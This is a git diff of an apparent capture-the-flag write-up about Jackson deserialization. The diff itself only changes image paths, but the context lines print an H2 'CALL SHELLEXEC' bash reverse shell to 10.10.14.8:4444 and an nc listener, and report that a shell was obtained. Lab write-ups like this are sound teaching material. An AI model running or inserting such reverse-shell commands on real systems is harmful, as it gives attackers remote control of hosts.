@@ -42,7 +42,7 @@ No admin panel. No hidden paths. But what caught my eye was how it **handled mal
 
 Normal JSON works:
 
-<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
 
 ```
 {"test":"hello"}
@@ -60,7 +60,7 @@ That’s **Jackson Deserialization**.
 
 
 
-<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 I dug into this article that became my savior:\
 🔗 [https://blog.doyensec.com/2019/07/22/jackson-gadgets.html](https://blog.doyensec.com/2019/07/22/jackson-gadgets.html)
@@ -86,7 +86,7 @@ CALL SHELLEXEC('bash -i >& /dev/tcp/10.10.14.8/4444 0>&1')
 nc -lvnp 4444
 ```
 
-<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 💥 **Reverse shell obtained!**
 
